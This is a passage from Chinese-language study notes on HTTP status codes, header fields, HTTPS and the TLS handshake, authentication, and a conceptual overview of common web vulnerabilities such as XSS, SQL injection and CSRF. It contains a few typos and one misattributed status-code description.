<ul><li>请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体。</li></ul></li> <li>407 Proxy Authentication Required
<ul><li>与401响应类似，只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个 Proxy-Authenticate 用以进行身份询问。客户端可以返回一个 Proxy-Authorization 信息头用以验证。</li></ul></li> <li>408 Request Timeout
<ul><li>请求超时。客户端没有在服务器预备等待的时间内完成一个请求的发送。客户端可以随时再次提交这一请求而无需进行任何更改。</li></ul></li> <li>409 Conflict
<ul><li>由于和被请求的资源的当前状态之间存在冲突，请求无法完成。这个代码只允许用在这样的情况下才能被使用：用户被认为能够解决冲突，并且会重新提交新的请求。该响应应当包含足够的信息以便用户发现冲突的源头。</li></ul></li> <li>410 Gone
<ul><li>被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。这样的状况应当被认为是永久性的。如果可能，拥有链接编辑功能的客户端应当在获得用户许可后删除所有指向这个地址的引用。如果服务器不知道或者无法确定这个状况是否是永久的，那么就应该使用 404 状态码。除非额外说明，否则这个响应是可缓存的。</li></ul></li> <li>411 Length Required
<ul><li>服务器拒绝在没有定义 Content-Length 头的情况下接受请求。在添加了表明请求消息体长度的有效 Content-Length 头之后，客户端可以再次提交该请求。</li></ul></li> <li>412 Precondition Failed
<ul><li>服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。</li></ul></li> <li>413 Payload Too Large
<ul><li>服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求。如果这个状况是临时的，服务器应当返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。</li></ul></li> <li>414 URI Too Long
<ul><li>请求的URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。这比较少见，通常的情况包括：本应使用POST方法的表单提交变成了GET方法，导致查询字符串（Query String）过长。</li></ul></li> <li>415 Unsupported Media Type
<ul><li>对于当前请求的方法和所请求的资源，请求中提交的实体并不是服务器中所支持的格式，因此请求被拒绝。</li></ul></li> <li>416 Range Not Satisfiable
<ul><li>如果请求中包含了 Range 请求头，并且 Range 中指定的任何数据范围都与当前资源的可用范围不重合，同时请求中又没有定义 If-Range 请求头，那么服务器就应当返回416状态码。</li></ul></li> <li>417 Expectation Failed
<ul><li>此响应代码意味着服务器无法满足 Expect 请求标头字段指示的期望值。</li></ul></li> <li>418 I'm a teapot
<ul><li>服务器拒绝尝试用 “茶壶冲泡咖啡”。</li></ul></li> <li>421 Misdirected Request
<ul><li>该请求针对的是无法产生响应的服务器。 这可以由服务器发送，该服务器未配置为针对包含在请求 URI 中的方案和权限的组合产生响应。</li></ul></li> <li>422 Unprocessable Entity (WebDAV)
<ul><li>请求格式良好，但由于语义错误而无法遵循。</li></ul></li> <li>423 Locked (WebDAV)
<ul><li>正在访问的资源被锁定。</li></ul></li> <li>424 Failed Dependency (WebDAV)
<ul><li>由于先前的请求失败，所以此次请求失败。</li></ul></li> <li>425 Too Early
<ul><li>服务器不愿意冒着风险去处理可能重播的请求。</li></ul></li> <li>426 Upgrade Required
<ul><li>服务器拒绝使用当前协议执行请求，但可能在客户机升级到其他协议后愿意这样做。 服务器在 426 响应中发送 Upgrade 头以指示所需的协议。</li></ul></li> <li>428 Precondition Required
<ul><li>原始服务器要求该请求是有条件的。 旨在防止“丢失更新”问题，即客户端获取资源状态，修改该状态并将其返回服务器，同时第三方修改服务器上的状态，从而导致冲突。</li></ul></li> <li>429 Too Many Requests
<ul><li>用户在给定的时间内发送了太多请求（“限制请求速率”）。</li></ul></li> <li>431 Request Header Fields Too Large
<ul><li>服务器不愿意处理请求，因为它的 请求头字段太大（ Request Header Fields Too Large）。 请求可以在减小请求头字段的大小后重新提交。</li></ul></li> <li>451 Unavailable For Legal Reasons
<ul><li>用户请求非法资源，例如：由政府审查的网页。</li></ul></li></ul> <h4 id="服务器错误-500-599"><a href="#服务器错误-500-599" class="header-anchor">#</a> 服务器错误 (500–599)</h4> <ul><li><strong>500 Internal Server Error</strong> <ul><li>服务器遇到了不知道如何处理的情况。</li></ul></li> <li><strong>501 Not Implemented</strong> <ul><li>此请求方法不被服务器支持且无法被处理。只有GET和HEAD是要求服务器支持的，它们必定不会返回此错误代码。</li></ul></li> <li><strong>502 Bad Gateway</strong> <ul><li>此错误响应表明服务器作为网关需要得到一个处理这个请求的响应，但是得到一个错误的响应。</li></ul></li> <li><strong>503 Service Unavailable</strong> <ul><li>服务器没有准备好处理请求。 常见原因是服务器因维护或重载而停机。 请注意，与此响应一起，应发送解释问题的用户友好页面。 这个响应应该用于临时条件和 Retry-After：如果可能的话，HTTP头应该包含恢复服务之前的估计时间。 网站管理员还必须注意与此响应一起发送的与缓存相关的标头，因为这些临时条件响应通常不应被缓存。</li></ul></li> <li>504 Gateway Timeout
<ul><li>当服务器作为网关，不能及时得到响应时返回此错误代码。</li></ul></li> <li>505 HTTP Version Not Supported
<ul><li>服务器不支持请求中所使用的HTTP协议版本。</li></ul></li> <li>506 Variant Also Negotiates
<ul><li>服务器有一个内部配置错误：对请求的透明内容协商导致循环引用。</li></ul></li> <li>507 Insufficient Storage
<ul><li>服务器有内部配置错误：所选的变体资源被配置为参与透明内容协商本身，因此不是协商过程中的适当端点。</li></ul></li> <li>508 Loop Detected (WebDAV)
<ul><li>服务器在处理请求时检测到无限循环。</li></ul></li> <li>510 Not Extended
<ul><li>客户端需要对请求进一步扩展，服务器才能实现它。服务器会回复客户端发出扩展请求所需的所有信息。</li></ul></li> <li>511 Network Authentication Required
<ul><li>511 状态码指示客户端需要进行身份验证才能获得网络访问权限。</li></ul></li></ul> <h3 id="http首部"><a href="#http首部" class="header-anchor">#</a> HTTP首部</h3> <p>HTTP协议的请求和响应报文中必定包含HTTP首部。首部内容为客户端和服务器分别处理请求和响应提供所需要的信息。</p> <p>根据不同上下文，可将消息头分为：</p> <ul><li>通用首部：同时适用于请求和响应消息，但与最终消息主体中传输的数据无关的消息头。</li> <li>请求首部：包含更多有关要获取的资源或客户端本身信息的消息头。</li> <li>响应首部：包含有关响应的补充信息，如其位置或服务器本身（名称和版本等）的消息头。</li> <li>实体首部：包含有关实体主体的更多信息，比如主体长(Content-Length)度或其MIME类型。</li></ul> <p>消息头也可以根据代理对其的处理方式分为：</p> <ul><li>端到端消息头
<ul><li>这类消息头必须被传输到最终的消息接收者，也即，请求的服务器或响应的客户端。中间的代理服务器必须转发未经修改的端到端消息头，并且必须缓存它们。</li></ul></li> <li>逐跳消息头
<ul><li>这类消息头仅对单次传输连接有意义，不能通过代理或缓存进行重新转发。这些消息头包括 <code>Connection</code>, <code>Keep-Alive</code>, <code>Proxy-Authenticate</code>, <code>Proxy-Authorization</code>, <code>TE</code>, <code>Trailer</code>, <code>Transfer-Encoding</code> 及 <code>Upgrade</code>。注意，只能使用 <code>Connection</code> 来设置逐跳一般头。</li></ul></li></ul> <h4 id="通用首部字段"><a href="#通用首部字段" class="header-anchor">#</a> 通用首部字段</h4> <table><thead><tr><th>首部字段名</th> <th>说明</th></tr></thead> <tbody><tr><td>Cache-Conctrol</td> <td>控制缓存的行为</td></tr> <tr><td>Connection</td> <td>逐跳首部、连接的管理</td></tr> <tr><td>Date</td> <td>创建报文的日期时间</td></tr> <tr><td>Pragma</td> <td>报文指令</td></tr> <tr><td>Trailer</td> <td>报文末端的首部一览</td></tr> <tr><td>Transfer-Encoding</td> <td>指定报文主体的传输编码方式</td></tr> <tr><td>Upgrade</td> <td>升级为其他协议</td></tr> <tr><td>Via</td> <td>代理服务器的相关信息</td></tr> <tr><td>Warning</td> <td>错误通知</td></tr></tbody></table> <h4 id="请求首部字段"><a href="#请求首部字段" class="header-anchor">#</a> 请求首部字段</h4> <table><thead><tr><th>首部字段名</th> <th>说明</th></tr></thead> <tbody><tr><td>Accept</td> <td>用户代理可处理的媒体类型</td></tr> <tr><td>Accept-Charset</td> <td>优先的字符集</td></tr> <tr><td>Accept-Encoding</td> <td>优先的内容编码</td></tr> <tr><td>Accept-Language</td> <td>优先的语言（自然语言）</td></tr> <tr><td>Authorization</td> <td>Web认证信息</td></tr> <tr><td>Expect</td> <td>期待服务器的特定行为</td></tr> <tr><td>From</td> <td>用户的电子邮箱地址</td></tr> <tr><td>Host</td> <td>请求资源所在服务器</td></tr> <tr><td>If-Match</td> <td>比较实体标记（ETag）</td></tr> <tr><td>If-Modified-Since</td> <td>比较资源的更新时间</td></tr> <tr><td>If-None-Match</td> <td>比较实体标记（与If-Match相反）</td></tr> <tr><td>If-Range</td> <td>资源未更新时发送实体Byte的范围请求</td></tr> <tr><td>If-Unmodified-Since</td> <td>比较资源的更新时间（与If-Modified-Since相反）</td></tr> <tr><td>Max-Forwards</td> <td>最大传输逐跳数</td></tr> <tr><td>Proxy-Authorization</td> <td>代理服务器要求客户端的认证信息</td></tr> <tr><td>Range</td> <td>实体的字节范围请求</td></tr> <tr><td>Referer</td> <td>对请求中URI的原始获取方</td></tr> <tr><td>TE</td> <td>传输编码的优先级</td></tr> <tr><td>User-Agent</td> <td>HTTP客户端程序的信息</td></tr></tbody></table> <h4 id="响应首部字段"><a href="#响应首部字段" class="header-anchor">#</a> 响应首部字段</h4> <table><thead><tr><th>首部字段名</th> <th>说明</th></tr></thead> <tbody><tr><td>Accept-Ranges</td> <td>是否接受字节范围请求</td></tr> <tr><td>Age</td> <td>推算资源创建经过时间</td></tr> <tr><td>ETag</td> <td>资源的匹配信息</td></tr> <tr><td>Location</td> <td>令客户端重定向至指定URI</td></tr> <tr><td>Proxy-Authenticate</td> <td>代理服务器对客户端的认证信息</td></tr> <tr><td>Retry-After</td> <td>对再次发起请求的时机要求</td></tr> <tr><td>Server</td> <td>HTTP服务器的安装信息</td></tr> <tr><td>Vary</td> <td>代理服务器缓存的管理信息</td></tr> <tr><td>WWW-Authenticate</td> <td>服务器对客户端的认证信息</td></tr></tbody></table> <h4 id="实体首部字段"><a href="#实体首部字段" class="header-anchor">#</a> 实体首部字段</h4> <table><thead><tr><th>首部字段名</th> <th>说明</th></tr></thead> <tbody><tr><td>Allow</td> <td>资源可支持的HTTP方法</td></tr> <tr><td>Content-Encoding</td> <td>实体主体适用的编码方式</td></tr> <tr><td>Content-Language</td> <td>实体主体的自然语言</td></tr> <tr><td>Content-Length</td> <td>实体主体的大小（单位：字节）</td></tr> <tr><td>Content-Location</td> <td>替代对应资源的URI</td></tr> <tr><td>Content-MD5</td> <td>实体主体的报文摘要</td></tr> <tr><td>Content-Range</td> <td>实体主体的位置范围</td></tr> <tr><td>Content-Type</td> <td>实体主体的媒体类型</td></tr> <tr><td>Expires</td> <td>实体主体过期的日期时间</td></tr> <tr><td>Ladt-Modified</td> <td>资源的最后修改时间</td></tr></tbody></table> <h2 id="https"><a href="#https" class="header-anchor">#</a> HTTPS</h2> <p>HTTP在安全方面主要有这些不足：</p> <ul><li>通信使用明文（不加密），内容可能被窃听</li> <li>不验证通信方的身份，因此有可能遭遇伪装</li> <li>无法证明报文的完整性，所以有可能已遭篡改</li></ul> <p><strong>HTTPS</strong> = <strong>HTTP</strong> + <strong>加密</strong> + <strong>认证</strong> + <strong>完整性保护</strong></p> <ul><li>HTTP加上加密处理和认证以及完整性保护后即是HTTPS</li> <li>HTTPS 是身披SSL 外壳的HTTP
<ul><li>HTTPS并非一种新协议。只是HTTP通信接口部分用SSL和TLS代替而已。</li></ul></li></ul> <h3 id="加密方式"><a href="#加密方式" class="header-anchor">#</a> 加密方式</h3> <ul><li>SSL采用公开密钥加密的加密处理方式
<ul><li>共享密钥加密（对称密钥加密）的困境
<ul><li>加密和解密使用同一个密钥的方式称为共享密钥加密（对称密钥加密 ）</li> <li>以共享密钥加密时必须将密钥也发给对方</li> <li>如果通信被窃听，那么密钥就会落入攻击者的手里</li> <li>只要拿到密钥，任何人都可以破解密码</li></ul></li> <li>使用两把密钥的公开密钥加密
<ul><li>公开密钥使用一对非对称密钥，即私有密钥和公开密钥</li> <li>使用公开密钥加密的方式
<ul><li>发送密文的一方使用对方的公开密钥进行加密处理</li> <li>对方收到加密的信息后，再使用自己的私有密钥进行解密</li></ul></li> <li>不需要发送用来解密的私有密钥，也不必担心密钥被攻击者窃听而盗走</li></ul></li> <li>HTTPS采用混合加密机制
<ul><li>HTTPS采用共享密钥加密和公开密钥加密两者并用的混合加密机制</li> <li>公开密钥加密处理起来比共享密钥加密方式更为复杂，因此若在通信时使用公开密钥加密方式，效率就很低</li> <li>充分利用两者各组的优势
<ul><li>在交换密钥环节使用公开密钥加密方式</li> <li>在建立通信交换报文阶段使用共享密钥加密方式</li></ul></li></ul></li></ul></li></ul> <h3 id="证书"><a href="#证书" class="header-anchor">#</a> 证书</h3> <ul><li>证明公开密钥正确性的证书
<ul><li>公开密钥加密方式的问题
<ul><li>无法证明公开密钥本身就是真正的公开密钥</li></ul></li> <li>使用由数字证书认证机构(CA)和其相关机关颁发的的公开密钥证书
<ul><li>数字证书认证机构处于客户端与服务器双方都可信赖的第三方机构的立场上</li> <li>服务器会将这份由数字证书认证机构颁发的公钥证书发送给客户端以进行公开密钥加密方式通信</li> <li>就受到证书的客户端可使用数字证书认证机构的公开密钥，对证书进行认证。</li> <li>多数浏览器开发商发布版本时，会事先在内部植入常用认证机关的公开密钥</li></ul></li> <li>可证明组织真实性的EV SSL证书
<ul><li>证书的一个作用是用来证明作为通信一方的服务器是否规范</li> <li>证书的另外一个作用可确认对方服务器背后运营的企业是否真实存在</li> <li>EV SSL证书是基于国际标准的认证知道方针颁发的证书</li></ul></li> <li>用以确认客户端的客户端证书
<ul><li>以客户端证书进行客户端认证，证明服务器正在做通信的对方始终是预料之内的客户端</li></ul></li></ul></li></ul> <h3 id="通信机制"><a href="#通信机制" class="header-anchor">#</a> 通信机制</h3> <ul><li>HTTPS的安全通信机制
<ul><li>HTTPS的通信步骤
<ul><li><img src="/assets/img/https_comunication_steps.48a77360.jpg"></li> <li>步骤 1： 客户端通过发送 Client Hello 报文开始 SSL 通信。报文中包 含客户端支持的 SSL 的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。</li> <li>步骤 2： 服务器可进行 SSL 通信时，会以 Server Hello 报文作为应答。和客户端一样，在报文中包含 SSL 版本以及加密组件。服务器的 加密组件内容是从接收到的客户端加密组件内筛选出来的。</li> <li>步骤 3： 之后服务器发送 Certificate 报文。报文中包含公开密钥证书。</li> <li>步骤 4： 最后服务器发送 Server Hello Done 报文通知客户端，最初阶 段的 SSL 握手协商部分结束。</li> <li>步骤 5： SSL 第一次握手结束之后，客户端以 Client Key Exchange 报 文作为回应。报文中包含通信加密中使用的一种被称为 Pre-master secret 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。</li> <li>步骤 6： 接着客户端继续发送 Change Cipher Spec 报文。该报文会提 示服务器，在此报文之后的通信会采用 Pre-master secret 密钥加密。</li> <li>步骤 7： 客户端发送 Finished 报文。该报文包含连接至今全部报文的 整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确 解密该报文作为判定标准。</li> <li>步骤 8： 服务器同样发送 Change Cipher Spec 报文。</li> <li>步骤 9： 服务器同样发送 Finished 报文。</li> <li>步骤 10： 服务器和客户端的 Finished 报文交换完毕之后，SSL 连接 就算建立完成。当然，通信会受到 SSL 的保护。从此处开始进行应用 层协议的通信，即发送 HTTP 请求。</li> <li>步骤 11： 应用层协议通信，即发送 HTTP 响应。</li> <li>步骤 12： 最后由客户端断开连接。断开连接时，发送 close_notify 报 文。上图做了一些省略，这步之后再发送 TCP FIN 报文来关闭与 TCP 的通信。</li></ul></li> <li>在以上流程中，应用层发送数据时会附加一种叫做 MAC（Message Authentication Code）的报文摘要。MAC 能够查知报文是否遭到篡改，从而保护报文的完整性。
下面是对整个流程的图解。图中说明了从仅使用服务器端的公开密钥 证书（服务器证书）建立 HTTPS 通信的整个过程。</li></ul></li></ul> <img src="/assets/img/https_comunication.5319ab2a.png"> <ul><li>SSL和TLS
<ul><li>HTTPS使用SSL和TLS这两个协议
<ul><li>TSL是以SSL为原型开发的协议，有时统一称该协议为SSL</li></ul></li> <li>HTTPS是使用SSL时，处理速度会变慢
<ul><li>通信慢</li> <li>大量消耗CPU及内存等资源导致的处理速度变慢</li></ul></li></ul></li> <li>为什么不一直使用HTTPS
<ul><li>节约资源
<ul><li>会消耗相当多的资源，平摊下来，能够处理的请求数量必定会减少</li></ul></li> <li>节约购买证书的开销</li></ul></li></ul> <h2 id="认证"><a href="#认证" class="header-anchor">#</a> 认证</h2> <p>某些web页面只想让特定的人浏览，实现这个目的需要的就是认证功能</p> <p>为了确认是都有访问的权限，需要核对信息，通常指以下这些信息：</p> <ul><li>密码：只有本人才会知道的字符串信息</li> <li>动态令牌：仅限本人持有的设备内显示的一次性密码</li> <li>数字证书：仅限本人（终端）持有的信息</li> <li>生物认证：指纹和虹膜等本人的生理信息</li> <li>IC卡等：仅限本人持有的信息</li></ul> <p>HTTP/1.1使用的认证方式</p> <ul><li>BASIC认证（基本认证）
<ul><li>BASIC认证使用上不够灵活，且达不到多数web网站期望的安全性等级，所以并不常用</li></ul></li> <li>DIGEST认证（摘要认证）
<ul><li>DIGEST认证和BASIC认证一样使用上不够灵活，且仍然达不到多数web网站对高度安全等级的追求标准，所以适用范围也有所受限</li></ul></li> <li>SSL客户端认证
<ul><li>虽然具有高度的安全等级，但因为导入及维持费用等问题，尚未普及</li></ul></li> <li>FormBase认证（基于表单认证）
<ul><li>认证多半为表单认证</li> <li>使用Cookie来管理Session，以弥补HTTP协议中不存在的状态管理功能</li></ul></li></ul> <h2 id="安全防范"><a href="#安全防范" class="header-anchor">#</a> 安全防范</h2> <h3 id="因输出值转义不完全引发的安全漏洞"><a href="#因输出值转义不完全引发的安全漏洞" class="header-anchor">#</a> 因输出值转义不完全引发的安全漏洞</h3> <ul><li><strong>跨站脚本攻击（XSS）</strong> <ul><li>指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击</li> <li>造成以下影响
<ul><li>利用虚假输入表单片区用户个人信息</li> <li>利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求</li> <li>显示伪造的文章或图片</li></ul></li> <li>XSS是攻击者利用预先设置的陷阱出发的被动攻击</li></ul></li> <li>SQL注入攻击
<ul><li>指针对Web应用使用的数据库，通过运行非法的SQL而产生的攻击</li> <li>造成以下影响
<ul><li>非法查看或篡改数据库内的数据</li> <li>规避认证</li> <li>执行和数据库服务器业务关联的程序等</li></ul></li></ul></li> <li>OS命令注入攻击
<ul><li>指通过Web应用执行非法的操作系统命令达到攻击的目的</li> <li>只要能调用Shell函数的地方就有存在被攻击的风险</li> <li>造成以下影响
<ul><li>让Windows或Linux操作系统的命令行启动程序</li> <li>获取Shell能获得的信息</li></ul></li></ul></li> <li>HTTP首部注入攻击
<ul><li>指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的以一种攻击。</li> <li>是被动攻击模式</li> <li>向首部主体内添加内容的攻击称为HTTP响应截断攻击</li> <li>造成以下影响
<ul><li>设置任何Cookie信息</li> <li>重定向至任意URL</li> <li>显示任意的主体（HTTP响应截断攻击）</li></ul></li></ul></li> <li>邮件首部注入攻击
<ul><li>指Web应用中的邮件发送功能，攻击者通过想邮件首部To或Subject内任意添加非法内容发起的攻击</li> <li>利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件</li></ul></li> <li>目录便利攻击
<ul><li>指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。</li> <li>有时也称为路径遍历攻击</li> <li>固然存在输出值转义的问题，但更应该关闭指定对任意文件名的访问权限</li></ul></li> <li>远程文件包含漏洞
<ul><li>指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取后，就可运行任意脚本的一种攻击</li> <li>固然存在输出值转义的问题，但更应该控制对任意文件名的指定</li></ul></li></ul> <h3 id="因设置或设计上的缺陷引发的安全漏洞"><a href="#因设置或设计上的缺陷引发的安全漏洞" class="header-anchor">#</a> 因设置或设计上的缺陷引发的安全漏洞</h3> <ul><li>强制浏览
<ul><li>指从安置在Web服务器的公开目录下的文件中，浏览哪些原本非自愿公开的文件</li> <li>造成以下影响
<ul><li>泄露顾客的个人信息等重要情报</li> <li>泄露原本需要具有访问权限的用户才可查阅的信息内容</li> <li>泄露为外连到外界的文件</li></ul></li></ul></li> <li>不正确的错误消息处理
<ul><li>指Web应用的错误信息内包含对攻击者有用的信息</li> <li>与Web应用有关的主要错误信息如下所示
<ul><li>Web应用抛出的错误消息</li> <li>数据库等系统抛出的错误消息</li></ul></li> <li>为了不让错误消息给攻击者以启发，建议将提示消息的内容仅保留到“认证错误”这种程度</li> <li>各系统应该对详细的错误消息进行抑制设定，或使用自定义错误消息，以避免某些错误消息给攻击者以启发</li></ul></li> <li>开放重定向
<ul><li>是一种对指定的任意URL作重定向跳转的功能</li> <li>与次功能相关联的安全漏洞是指，假如指定的重定向URL到某个具有恶意的web网站，那么用户就会被诱导至那个Web网站</li></ul></li></ul> <h3 id="因会话管理疏忽引发的安全漏洞"><a href="#因会话管理疏忽引发的安全漏洞" class="header-anchor">#</a> 因会话管理疏忽引发的安全漏洞</h3> <ul><li>会话劫持
<ul><li>指攻击者通过某种手段拿到了用户的会话ID，并非法使用次会话ID伪装成用户，达到攻击的目的</li> <li>几种攻击者可获得会话ID的途径
<ul><li>通过非正规的生成方法推测会话ID</li> <li>通过窃听或XSS攻击盗取会话ID</li> <li>通过会话固定攻击强行获取会话ID</li></ul></li></ul></li> <li>会话固定攻击
<ul><li>会话固定攻击会强制用户使用攻击者指定的会话ID</li> <li>属于被动攻击</li></ul></li> <li><strong>跨站点请求伪造（CSRF）</strong> <ul><li>指攻击者通过设置好的陷阱，强制对已完成验证的用户进行非预期的个人信息或设定信息等某些状态更新</li> <li>属于被动攻击</li> <li>造成一下影响
<ul><li>利用已通过认证的用户权限更新设定信息等</li> <li>利用已通过认证的用户权限购买商品</li> <li>利用已通过认证的用户权限在留言板上发表言论</li></ul></li></ul></li></ul> <h3 id="其他安全漏洞"><a href="#其他安全漏洞" class="header-anchor">#</a> 其他安全漏洞</h3> <ul><li>密码破解
<ul><li>即算出密码，突破认证</li> <li>两种手段
<ul><li>通过网络的密码试错
<ul><li>穷举法</li> <li>字典攻击</li></ul></li> <li>对已加密密码的破解（指攻击者入侵系统，已获得加密或散列处理的密码数据的情况）
<ul><li>通过穷举法/字典攻击进行类推</li> <li>彩虹表</li> <li>获取密钥</li> <li>加密算法的漏洞</li></ul></li></ul></li></ul></li> <li><strong>点击劫持</strong> <ul><li>指利用透明的按钮或链接做成陷阱，覆盖在Web页面之上，诱使用户在不知情的情况下，点击链接访问内容的一种攻击手段</li> <li>也称为界面伪装</li></ul></li> <li>DoS攻击
<ul><li>指一种让运行中的服务呈停止状态的攻击</li> <li>有时也叫服务停止攻击或拒绝服务攻击</li> <li>主要有两种DoS攻击方式
<ul><li>几种利用访问清酒造成资源过载，资源用尽的同时，实际上服务也就呈停止状态</li> <li>通过攻击安全漏洞是服务停止</li></ul></li> <li>多台计算机发起的DoS攻击称为DDoS攻击
<ul><li>通常利用感染病毒的计算机作为攻击者的攻击跳板</li></ul></li></ul></li> <li>后门程序
<ul><li>指开发设置的隐藏入口，可不按正常步骤使用首先功能</li> <li>通常为以下三种类型
<ul><li>开发阶段作为Debug调用的后门程序</li> <li>开发者为了自身利益植入的后门程序</li> <li>攻击者通过某种方法设置的后门程序</li></ul></li></ul></li></ul></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/note/computer_network.html" class="prev">
        计算机网络
      </a></span> <!----></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.6c44c61c.js" defer></script><script src="/assets/js/2.899c2632.js" defer></script><script src="/assets/js/5.693eaf24.js" defer></script>
  </body>
</html>
